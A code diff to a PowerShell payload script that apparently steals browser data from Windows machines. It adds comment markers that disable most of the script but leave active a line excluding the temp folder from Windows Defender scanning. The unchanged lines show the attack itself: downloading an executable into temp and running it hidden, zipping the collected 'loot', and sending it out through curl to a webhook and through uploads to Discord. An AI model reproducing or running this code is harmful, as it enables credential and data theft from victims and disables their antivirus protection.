@@ -1,3 +1,4 @@
+<#
 function DropBox-Upload {
 
 [CmdletBinding()]
@@ -48,10 +49,10 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}
 
 
-
+#>
 # Add C:/ to exlusions so Windows Defender doesnt flag the exe we will download
 Add-MpPreference -ExclusionPath $env:tmp
-
+<#
 # Download the exe and save it to temp directory
 iwr "" -outfile "$env:tmp\browser.exe"
 
@@ -61,3 +62,4 @@ cd $env:tmp;Start-Process -FilePath "$env:tmp\browser.exe" -WindowStyle h -Wait
 # Exfiltrate the loot to discord
 Compress-Archive -Path "$env:tmp\results" -DestinationPath $env:tmp\browserdata.zip
 Upload-Discord -file "$env:tmp\browserdata.zip"
+#>
